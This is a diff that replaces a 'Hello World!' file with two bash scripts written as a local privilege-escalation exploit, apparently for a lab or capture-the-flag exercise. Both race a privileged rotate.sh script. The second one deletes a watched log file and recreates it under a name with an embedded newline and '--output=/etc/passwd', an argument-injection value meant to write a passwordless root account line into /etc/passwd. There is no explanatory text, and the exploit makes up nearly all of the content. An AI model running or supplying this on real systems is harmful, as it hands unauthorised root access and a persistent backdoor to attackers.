@@ -1,1 +1,59 @@
-Hello World!
+something like:
+
+#!/bin/bash
+
+TARGET_FILE="/var/log/tmp/somefile"
+MALICIOUS_DIR="/var/log/tmp"
+CHECK_INTERVAL=0.05
+
+echo "[*] Launching vulnerable script..."
+sudo /usr/bin/rotate.sh &  # or whatever script needs monitoring
+
+echo "[*] Monitoring for file creation..."
+
+while true; do
+    if [ -f "$TARGET_FILE" ]; then
+        echo "[!] Detected file: $TARGET_FILE"
+        echo "[*] Paused. Make your changes now."
+        read -p ">> Press ENTER to continue the script..."
+        break
+    fi
+    sleep $CHECK_INTERVAL
+done
+
+echo "[*] Resuming and waiting for script to finish..."
+wait
+
+---------------------------------------
+
+#!/bin/bash
+
+TARGET_FILE="/var/log/tmp/auth.log"
+MALICIOUS_DIR="/var/log/tmp"
+CHECK_INTERVAL=0.01
+
+# Line to insert into /etc/passwd (gives root access)
+MALICIOUS_CONTENT="pwned::0:0::/root:/bin/bash"
+
+echo "[*] Launching vulnerable script..."
+sudo /usr/bin/rotate.sh &
+
+echo "[*] Monitoring for file creation..."
+
+while true; do
+    if [ -f "$TARGET_FILE" ]; then
+        echo "[*] File detected. Replacing immediately..."
+
+        sudo rm "$TARGET_FILE"
+
+        # Create the malicious file with embedded newline in its name
+        MALICIOUS_NAME=$'auth.log\n--output=/etc/passwd'
+        MALICIOUS_PATH="$MALICIOUS_DIR/$MALICIOUS_NAME"
+
+        echo "$MALICIOUS_CONTENT" | sudo tee "$MALICIOUS_PATH" > /dev/null
+
+        echo "[*] Malicious file created: $MALICIOUS_PATH"
+        break
+    fi
+    sleep $CHECK_INTERVAL
+done
